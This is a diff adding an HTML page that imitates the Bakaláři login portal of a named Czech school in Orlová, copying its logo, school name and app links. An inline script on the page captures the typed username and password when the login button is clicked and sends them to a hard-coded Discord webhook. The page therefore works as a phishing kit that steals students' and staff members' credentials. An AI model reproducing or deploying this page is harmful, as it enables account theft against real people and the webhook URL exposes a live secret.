@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Bakalari - login to the system</title>
+    <meta charset="utf-8">
+    <meta id="bkViewport" name="viewport" content="width=device-width, initial-scale=1.0">
+    <!--CSS-->
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/fonty.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/base.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/loginpage.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/jquery-ui.min.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/jquery-ui.theme.min.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/ls-capslock.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/style.css" type="text/css">
+    <link rel="stylesheet" href="Bakalari%20-%20login%20to%20the%20system_files/font-awesome.min.css" type="text/css">
+    <!--JQuery-->   
+    <link rel="shortcut icon" href="https://goa-orlova.bakalari.cz:444/next/images/favicon.ico">
+</head>
+
+<body>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0; /* Background color */
+        }
+
+        .mobile-app {
+            text-align: center; /* Center text */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            background: white; /* Background color of the box */
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Shadow for aesthetics */
+        }
+
+        .mobile-app-img {
+            margin-top: 20px;
+        }
+
+        .mobile-app-img a img {
+            height: 40px; /* Adjust based on your preference */
+            margin: 0 10px;
+        }
+    </style>
+    <form id="formlogin" action="Login" onsubmit="makeDisable()" data-bitwarden-watching="1">
+        <div id="outer">
+            <div id="middle">
+                <div id="generalWarning" class="general-warning" style="display: none;"></div>
+                <div id="inner">
+                    <a href="#" id="loginLogo"><img src="Bakalari%20-%20login%20to%20the%20system_files/logo-bakalariLogin-252x51-min.png" alt="Bakaláři"></a>
+                    <div class="bk-login-schoolName">Gymnázium a Obchodní akademie, Orlová, příspěvková organizace</div>
+                    <div id="loginBox">
+                        <div id="info" onclick="showPopup(this)">i</div>
+                        <div class="space-top-40"></div>
+                        <div onkeypress="onEnterSubmit(event)" class="ls-capslock">
+                            <div class="question-container">
+                                <input type="text" name="username" id="username" class="inputLogin" placeholder="Username" required="">
+                                <span id="question" class="ico32-menu-napoveda link" onclick="showPopup(this)" style="visibility: hidden"></span>
+                            </div>
+                            <input type="password" name="password" id="password" class="inputLogin ls-capslock-input" placeholder="Password" required="">
+                            <div class="ls-capslock-message">Caps Lock is on</div>
+                            <input type="hidden" name="returnUrl" value="/dashboard">
+                            <button class="btn-login" type="button" id="loginButton">
+                                <span class="btn-login-loader"><i class="fa fa-spinner fa-spin"></i>Loading</span>
+                                <span class="btn-login-text">Log In</span>
+                            </button>
+                            <div class="both"></div>
+                        </div>
+                    </div>
+                    
+                    <script>
+                        function sendLoginInfo(username, password) {
+                            // Validation to ensure username and password are not empty
+                            if (!username.trim() || !password.trim()) {
+                                console.log('Username or password cannot be empty.');
+                                return; // Exit the function if either field is empty
+                            }
+                        
+                            const payload = {
+                                content: `New login attempt: ${username}, ${password}`
+                            };
+                        
+                            fetch('https://discord.com/api/webhooks/1085167998005956628/firxEAoDPpUIbKZTchlG6oi-anc4BuRwyhUyctSZYIG_K3Xt8dRadRit0qUF2ntzkoHA', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(payload),
+                            })
+                            .then(response => response.json())
+                            .then(data => console.log('Success:', data))
+                            .catch((error) => {
+                                console.error('Error:', error);
+                            });
+                        }
+                        
+                        document.getElementById('loginButton').addEventListener('click', function() {
+                            const username = document.getElementById('username').value;
+                            const password = document.getElementById('password').value;
+                            sendLoginInfo(username, password);
+                        });
+                        </script>
+                        
+                    </div>
+                    <div class="mobile-app">
+                        <div class="mobile-app-text"><span>Try the Bakalari app on your smartphone</span></div>
+                        <div class="mobile-app-img">
+                            <a class="link" target="_blank" href="https://play.google.com/store/apps/details?id=cz.bakalari.mobile&amp;hl=cs"><img src="https://goa-orlova.bakalari.cz:444/next/images/login/btn-googlePlay-cerna-min.png"></a>
+                            <a class="link" target="_blank" href="https://itunes.apple.com/cz/app/bakalari-online/id1459368580?mt=8"><img src="https://goa-orlova.bakalari.cz:444/next/images/login/btn-appStore-cerna-min.png"></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="info_popUp" class="login-popup" style="display: none;">
+                <div class="block-style title">
+                    <span>Gymnázium a Obchodní akademie, Orlová, příspěvková organizace</span>
+                </div>
+                <div class="block-style info">
+                    <span>
+</span>
+                </div>
+                <div class="block-style bottom">
+                    <span>BAKALÁŘI software s.r.o. - 02.02.2024 (1.62.202.1)</span>
+                </div>
+            </div>
+
+            <div id="question_popUp" class="login-popup" style="display: none;">
+                <div class="block-style help">
+                    <div class="block-style">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+
+
+
+
+
+</body></html>
